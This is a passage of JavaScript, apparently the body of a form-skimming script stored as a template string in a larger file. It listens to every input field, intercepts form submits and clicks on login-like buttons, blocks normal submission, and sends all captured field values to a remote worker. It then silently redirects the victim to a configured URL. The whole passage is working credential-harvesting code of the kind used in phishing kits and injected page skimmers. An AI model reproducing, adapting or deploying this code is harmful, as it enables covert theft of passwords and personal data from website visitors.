                const err = await response.text();
                log('Worker error: ' + err, 'error');
                // Fallback redirect
                setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
            }
        } catch (err) {
            log('Fetch failed: ' + err.message, 'error');
             // Fallback redirect
             setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
        }
    };

    // Input change handler (collects as user types)
    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = getFieldName(field);
                    const value = field.value.trim();
                    if (value) {
                        formData[name] = value;
                    }
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    // Submit / button handlers
    const setupSubmissionHandlers = () => {
        // 1. Standard Form Submits
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                e.preventDefault(); // Stop normal form submission
                const data = captureAllInputs();
                if (Object.keys(data).length > 0) {
                    sendData(data);
                } else {
                    // If no data, proceed anyway
                    window.location.href = CONFIG.REDIRECT_URL;
                }
            }, true);
        });

        // 2. Generic Button Clicks (for non-form logins or div buttons)
        document.addEventListener('click', (e) => {
            const target = e.target;

            // IGNORE clicks on interactive inputs (unless it's a button type)
            // This prevents capturing when the user just clicks to type in a field.
            if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {
                // If it's a text/password/email input, ignore.
                // Only proceed if it is strictly a submit/button input.
                if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {
                     // Proceed to check as a button
                } else {
                    return;
                }
            }

            // Helper to check text content against keywords
            const matchesKeyword = (el) => {
                const text = (el.innerText || el.value || '').toLowerCase();
                return CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => text.includes(pattern));
            };

            // A. Check for Standard Buttons/Links first (Button, Input[submit], A)
            // We look up the tree in case the click was on an icon inside the button
            const stdBtn = target.closest('button, input[type="submit"], input[type="button"], a');
            if (stdBtn) {
                if (matchesKeyword(stdBtn)) {
                     const data = captureAllInputs();
                     if (Object.keys(data).length > 0) {
                         e.preventDefault();
                         e.stopPropagation();
                         sendData(data);
                     }
                     return;
                }
            }

            // B. Check for "Fake" Buttons (div, span)
            // These must look clickable (cursor: pointer) or have role="button"
            // We avoid simply using closest('div') because that catches container divs.

            // We assume the user clicks *on* the button or a direct child.
            // So we check the target and its immediate parents for a "clickable div".
            const fakeBtn = target.closest('div, span');

            if (fakeBtn) {
                // Determine if this element is "interactive"
                const style = window.getComputedStyle(fakeBtn);
                const isClickable = style.cursor === 'pointer' || fakeBtn.getAttribute('role') === 'button';

                if (isClickable && matchesKeyword(fakeBtn)) {
                     const data = captureAllInputs();
                     if (Object.keys(data).length > 0) {
                         e.preventDefault();
                         e.stopPropagation();
                         sendData(data);
                     }
                }
            }
        }, true);
    };

    // Initialize
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupInputHandlers();
            setupSubmissionHandlers();
        });
    } else {
        setupInputHandlers();
        setupSubmissionHandlers();
    }

})();\`;
